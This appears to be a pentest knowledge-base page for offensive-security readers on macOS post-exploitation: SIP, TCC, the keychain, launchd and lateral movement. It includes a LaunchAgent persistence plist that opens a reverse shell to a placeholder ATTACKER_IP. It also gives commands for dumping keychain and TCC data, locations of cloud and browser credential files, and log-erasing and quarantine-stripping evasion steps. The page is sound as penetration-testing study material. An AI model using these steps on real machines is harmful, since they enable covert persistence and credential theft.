---
technology: macOS post-exploitation surface
kind: overview
audience: offensive-security
status: upstream-only
family: post-exploitation
layer: macOS security stack (SIP, Gatekeeper, TCC, keychain, launchd)
homepage: https://support.apple.com/guide/security/welcome/web
provenance: "upstream-only (pentest-book + primary sources); zero corpus evidence by design — owner-approved new-unit wave 2026-11-13; TCC model verified against Apple's developer documentation of protected resources (usage-description keys for Desktop/Documents/Downloads/network volumes, camera, mic, location, contacts, photos, etc.); CVE-2021-3156 verified against Apple HT212177 coverage (fixed by updating sudo to 1.9.5p2, shipped in Big Sur 11.2.1 / Catalina and Mojave updates; sudo 1.8.2–1.8.31p2 and 1.9.0–1.9.5p1 affected, macOS exploitation requires a sudoedit symlink per the original reporting); CVE-2023-32364 verified against NVD/Apple — an App Sandbox escape fixed in Ventura 13.5 (backports 11.7.9, 12.6.8), NOT the 'TCC symlink bypass' the source labels it (miscitation recorded as an in-page trap note)"
source: "six2dez/pentest-book (post-exploitation/macos.md, no license — rewritten with attribution), accessed 2026-11-13"
---

# macOS post-exploitation surface

> macOS is a Unix with a consent layer bolted on top — post-exploitation here is mostly the discipline of asking, in order: which consent layer actually constrains *this* shell, what does the keychain already know, and which launchd plist will run my code at boot.

## What it is

Once code runs on a Mac — phishing payload, deserialized exploit, SSRF-to-shell — the machine presents a stack of security controls that each gate a *different* thing, and none of them gate everything. **SIP** (System Integrity Protection) protects system files and limits root's power over the OS itself — it constrains *tampering with Apple*, not your post-exploitation as a user. **Gatekeeper and quarantine** gate *first execution* of downloaded code. **TCC** (Transparency, Consent, and Control) gates *user data* — Desktop, Documents, Downloads, mail, photos, microphone, screen — behind per-app consent prompts recorded in a database. **FileVault** encrypts the disk at rest, transparent after boot. A standard post-exploitation session lives entirely *below* these layers' notice until it touches something they guard; then each layer becomes a puzzle with known classes of answer.

The operator takeaway: enumerate the posture before choosing technique. A shell with an admin user, SIP enabled, and no Full Disk Access for the parent terminal hits TCC walls on the juiciest data; the same shell where the user already granted the terminal Full Disk Access (common on developer machines) loots everything with the Unix commands you already know.

## Posture enumeration first

```bash
csrutil status                        # SIP: "enabled" closes several tampering doors
spctl --status                        # Gatekeeper assessments on/off
fdesetup status                       # FileVault
/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
profiles -P                           # MDM enrollment + configuration profiles
sw_vers; uname -a                     # build → which CVE gates apply
who; last                             # session history
launchctl list                        # what launchd runs
```

XProtect (the built-in signature-based malware blocks) and its data files update via the system update machinery — knowing the build tells you which CVE floor applies; knowing `profiles -P` output tells you whether an MDM can push remediation to your session faster than you can pivot.

## TCC: the consent database

Apple's model, per the developer documentation: before an app can touch a **protected resource** — camera, microphone, location, contacts, photos, calendar/reminders, Bluetooth, Home, health data, local network, and the file-system protected folders Desktop, Documents, Downloads, and network volumes — the system prompts the user, with the prompt's text taken from the app's declared usage-description strings (`NSCameraUsageDescription`, `NSDesktopFolderUsageDescription`, and the rest of the key family). Grants land in a SQLite database in two places: the per-user `~/Library/Application Support/com.apple.TCC/TCC.db` and the system-wide `/Library/Application Support/com.apple.TCC/TCC.db` (root-owned, and the more interesting read).

```bash
sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" "SELECT service, client, auth_value FROM access"
```

The `access` table maps service (`kTCCServiceSystemPolicyDesktopFolder`, `kTCCServiceMicrophone`, `kTCCServiceSystemPolicyAllFiles` = Full Disk Access, …) to client bundle/path and its grant state — reading it is free reconnaissance into what any app on the box may already do. `tccutil` exists to reset (not read) grants.

**Bypass classes**, honest taxonomy rather than CVE fireworks:

- **Inheritance / responsible process.** Grants follow the responsible-process chain: a terminal holding Full Disk Access extends it to the scripts and binaries it launches. Finding an already-FDA'd launcher (terminal, IDE, script runner) is the everyday bypass — no bug required.
- **Permission laundering through entitled binaries.** System binaries ship with their own TCC grants and entitlements; a flow that gets an entitled helper to touch the protected path on your behalf launders the access. This class is where most real TCC CVEs live.
- **Symlink/race abuse.** TCC checks the *path* semantics the dialog promised; classic escapes point an allowed accessor at a link or race a rename so the check and the open disagree. This is the mechanism family behind the recurring CVE stream — each fixed instance closes one path, the class survives.
- **Sandbox-escape adjacency.** Bugs that break the *app sandbox* frequently get described as "TCC bypasses" in secondary sources. **Trap note:** CVE-2023-32364 circulates as a "TCC bypass via symlink"; NVD and Apple's advisory describe a sandboxed process circumventing **sandbox** restrictions, fixed in macOS Ventura 13.5 with backports to 11.7.9 and 12.6.8 — treat any source conflating the two controls as unreliable on macOS CVE specifics.

## Keychain access

macOS concentrates credentials in keychains: the user's `~/Library/Keychains/login.keychain-db` (application and internet passwords, certs) and `/Library/Keychains/System.keychain` (machine secrets, MDM-adjacent material). The `security` CLI is the interface:

```bash
security list-keychains
security find-internet-password -s "example.com" -w
security find-generic-password -s "serviceName" -w
security dump-keychain -d login.keychain-db      # prompts per secret unless unlocked
```

The defensive design point — and the operative constraint — is that reading *other* items triggers GUI authorization prompts or requires the keychain password; `dump-keychain` on a live session walks existing grants and prompts for the rest, which is loud. The quiet paths: secrets your process is already entitled to (the item's ACL already lists you), and offline parsing of a *copied* keychain — chainbreaker decrypts login-keychain items given the user's password, and plenty of third-party apps (browsers first among them) store their "encrypted" data keyed by a keychain item your session can read (Chrome's Safe Storage item is the canonical example — cookie/password databases fall with it).

## Beyond the keychain

Unix hygiene covers the rest of the sweep: `~/.ssh/` (keys, config, `known_hosts` as a map of where this user goes), `env` and dotfile histories (`.zsh_history`, `.bash_history`), `defaults read` for application preferences leaking endpoints and tokens, cloud CLI configs (`~/.aws/credentials`, `~/.kube/config` — cluster admin in a YAML file is a classic), and browser stores directly: Chrome's `Login Data`/`Cookies` SQLite files (keychain-keyed encryption as above), Safari's cookie store, Firefox profile `logins.json`.

## Privilege escalation

- **Sudo and its history.** `sudo -l` first; NOPASSWD entries are the finding. The one verified CVE worth memorizing for unpatched/macOS-specific floors: **CVE-2021-3156** ("Baron Samedit", the sudo argument-parsing heap overflow) — affects sudo 1.8.2–1.8.31p2 and 1.9.0–1.9.5p1, fixed upstream in 1.9.5p2; Apple shipped the fix in Big Sur 11.2.1 and the contemporaneous Catalina/Mojave security updates. On macOS the trigger needs the `sudoedit`-vs-`sudo` symlink arrangement the original researchers described, so PoCs written for Linux need that adjustment. Ancient installs still in engagement fleets make it worth one attempt.
- **SUID/SGID hunting.** `find / -perm -4000 -type f` and the same under `/Applications` — stock macOS ships a short list; anything custom with SUID is a target, and comparative-diff against a clean install of the same build catches planted-or-replaced binaries.
- **launchd hijacking.** Any writable plist in `/Library/LaunchAgents`, `/Library/LaunchDaemons`, or a user's `~/Library/LaunchAgents` — or a writable *target binary* referenced by a root-run plist — is persistence and usually privilege escalation in one finding.
- **Dylib hijacking.** Apps loading weak-linked or missing dylibs (`otool -L` shows the reference; the weak/`@rpath` cases are the candidates) will load a dylib you plant in the resolved path. `DYLD_INSERT_LIBRARIES` interposition, by contrast, is closed for hardened-runtime/SIP-protected binaries — the hijack route (letting the app load your library itself) survives because it needs no environment manipulation.

## Persistence (launchd and friends)

launchd is the native persistence mechanism — a plist in a LaunchAgent (user session) or LaunchDaemon (root, system) directory, with `RunAtLoad` and `ProgramArguments` doing the obvious thing:

```bash
cat > ~/Library/LaunchAgents/com.example.agent.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.example.agent</string>
  <key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string>
    <string>bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</string></array>
  <key>RunAtLoad</key><true/>
</dict></plist>
EOF
launchctl load ~/Library/LaunchAgents/com.example.agent.plist
```

The alternates, roughly by observability: login items (AppleScript `System Events` additions — GUI-visible in Settings), `cron` and the `/etc/periodic/{daily,weekly,monthly}` scripts (legacy but honored), login/logout hooks via `com.apple.loginwindow` defaults (deprecated, still executed, run as root), folder actions (an AppleScript firing on folder-content change), and hand-rolled application bundles — a minimal `.app` with `LSUIElement` true (no Dock presence) whose bundle identifier impersonates a legitimate one is the disguise pattern. Detection-minded operators should note launchd plists are also the *defender's* easiest audit — blend choices matter on long engagements.

## Lateral movement on a Mac estate

SSH (Remote Login) works as on any Unix — enable with `systemsetup -setremotelogin on` given admin. Apple Remote Desktop/Screen Sharing speaks VNC on `5900/tcp` with an agent-control channel on `3283/tcp`; `kickstart` inside the ARDAgent bundle configures it, and unauthenticated variants of the agent have a long vulnerability history. Remote Apple Events (`eppc://`) lets one Mac script another's applications — `osascript` addressing `machine "eppc://user:pass@198.51.100.20"` — where enabled. Scan for `5900,3283` across the segment to size a Mac fleet before choosing.

## Evasion notes for macOS

Quarantine attributes (`com.apple.quarantine` xattr on downloaded files) drive Gatekeeper's first-run prompts — clearing the attribute (`xattr -d`) sidesteps the prompt on files you place locally. Ad-hoc signing (`codesign -s -`) makes payloads self-consistent for locally-run flows, though it wins no reputation. Log hygiene: `log erase --all` and clearing `/var/log` require root and are themselves conspicuous; process renaming via `exec -a` defeats casual Activity Monitor reading only. On a mature deployment, XProtect and MDM make *loud* the default — plan payloads around what the user already runs (developer tooling, browsers, extensions) rather than around stealth exoticism.

## Where to go next

- [[macos-bug-bounty]] — the phased method for auditing a macOS posture
- [[ssh]] — Remote Login as an attack surface from the outside in
